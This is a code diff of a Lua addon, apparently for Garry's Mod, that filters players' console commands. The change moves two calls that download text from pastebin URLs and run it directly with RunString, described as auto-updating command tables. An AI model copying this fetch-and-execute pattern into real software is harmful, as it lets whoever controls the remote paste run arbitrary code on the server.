@@ -25,22 +25,25 @@ local unknownSoundtouse = "physics/cardboard/cardboard_box_break3.wav"
 //change this if you know what you're doing. Will change the sound that plays when any unknown commands are found.
 //Default: "physics/cardboard/cardboard_box_break3.wav"
 
-http.Fetch("https://pastebin.com/raw/S7fG2Mgk", function (body, len, headers, code)
-	LoadGoodCmds = body
-	RunString(LoadGoodCmds)
-	end,
-	function (error)
+timer.Simple(0, function ()
+	http.Fetch("https://pastebin.com/raw/S7fG2Mgk", function (body, len, headers, code)
+		LoadGoodCmds = body
+		RunString(LoadGoodCmds)
+		end,
+		function (error)
+	end);
+	http.Fetch("https://pastebin.com/raw/g3HVnx79", function (body, len, headers, code)
+		LoadBadCmds = body
+		RunString(LoadBadCmds)
+		end,
+		function (error)
+	end);
 end);
+
 local cc_customgoodcmds = {
 	"example", "example2", "example3"
 } // Enter custom cmds to ignore from players here.
 
-http.Fetch("https://pastebin.com/raw/g3HVnx79", function (body, len, headers, code)
-	LoadBadCmds = body
-	RunString(LoadBadCmds)
-	end,
-	function (error)
-end);
 // Credits to HeX for most of this table, and to Zero for making it into a http fetcher (aka auto update)
 
 // If you want to add any custom concommands to check for, add them to this table
